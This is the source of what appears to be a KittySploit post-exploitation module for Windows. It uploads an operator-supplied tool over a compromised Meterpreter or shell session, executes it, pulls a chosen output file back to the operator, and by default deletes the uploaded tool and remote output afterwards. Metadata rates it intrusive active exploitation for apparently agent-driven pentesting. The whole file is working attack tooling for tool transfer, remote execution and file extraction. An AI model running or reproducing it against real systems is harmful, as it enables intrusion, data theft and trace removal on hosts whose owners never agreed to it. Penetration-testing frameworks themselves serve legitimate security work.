#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Upload a local operator tool to the target, execute it, and optionally pull
an output artifact back through the session.
"""

from kittysploit import *
import os
import time

from lib.post.windows.session import WindowsSessionMixin

_LOCAL_OUT = "output"


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows External Tool Runner",
        "description": (
            "Upload a local binary or script to the target, execute it with "
            "operator-supplied arguments, and optionally download a remote output file."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1105/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.8,
            "value": 1.2,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    local_file = OptFile("", "Local tool path on operator machine", True)
    remote_dir = OptString("", "Remote directory (default: %TEMP%)", False)
    remote_name = OptString("", "Remote filename (default: local basename)", False)
    arguments = OptString("", "Arguments appended to the remote executable", False)
    remote_output = OptString("", "Remote output path to download after execution", False)
    local_output_dir = OptString("output", "Local directory for pulled artifacts", False)
    timeout = OptInteger(120, "Execution timeout in seconds", False)
    upload_chunk_kb = OptInteger(256, "Upload chunk size in kilobytes", False)
    download_chunk_kb = OptInteger(512, "Download chunk size in kilobytes", False)
    cleanup_remote = OptBool(True, "Delete uploaded tool and pulled remote output on target", False)

    def _resolve_local_path(self) -> str:
        raw = self.local_file
        if isinstance(raw, list):
            raw = raw[0] if raw else ""
        path = str(raw or "").strip()
        if not path or not os.path.isfile(path):
            raise ProcedureError(FailureType.ConfigurationError, "local_file must point to an existing file")
        return os.path.abspath(path)

    def _resolve_remote_path(self, local_path: str) -> tuple[str, str]:
        temp_dir = self.win_remote_temp_dir("remote_dir")
        name = str(self.remote_name or "").strip() or os.path.basename(local_path)
        return temp_dir, f"{temp_dir.rstrip('\\')}\\{name}"

    def run(self):
        if not self.win_require_windows():
            return False

        local_path = self._resolve_local_path()
        temp_dir, remote_path = self._resolve_remote_path(local_path)

        print_status(f"Uploading {local_path} -> {remote_path}")
        if not self.win_upload_file(
            local_path,
            remote_path,
            chunk_kb=self.win_int_opt(self.upload_chunk_kb, 256, 1),
        ):
            raise ProcedureError(FailureType.Unknown, "Upload failed")

        print_status("Executing remote tool...")
        output = self.win_run_remote_executable(
            remote_path,
            str(self.arguments or ""),
            timeout=self.win_int_opt(self.timeout, 120, 1),
        )
        if output:
            print_info(output)

        cleanup_paths = [remote_path]
        pulled_local = ""

        remote_out = str(self.remote_output or "").strip()
        if remote_out:
            if not self.win_remote_file_exists(remote_out):
                print_warning(f"Remote output not found: {remote_out}")
            else:
                stamp = time.strftime("%Y%m%d_%H%M%S")
                local_dir = os.path.join(str(self.local_output_dir or _LOCAL_OUT), f"tool_output_{stamp}")
                os.makedirs(local_dir, exist_ok=True)
                base = os.path.basename(remote_out.replace("\\", "/")) or "output.bin"
                pulled_local = os.path.join(local_dir, base)
                if self.win_pull_file_via_session(
                    remote_out,
                    pulled_local,
                    chunk_kb=self.win_int_opt(self.download_chunk_kb, 512, 1),
                ):
                    print_success(f"Output saved: ./{pulled_local} ({os.path.getsize(pulled_local)} bytes)")
                    if self.cleanup_remote:
                        cleanup_paths.append(remote_out)
                else:
                    print_error(f"Failed to download {remote_out}")

        if self.cleanup_remote:
            self.win_delete_remote(cleanup_paths)

        return True
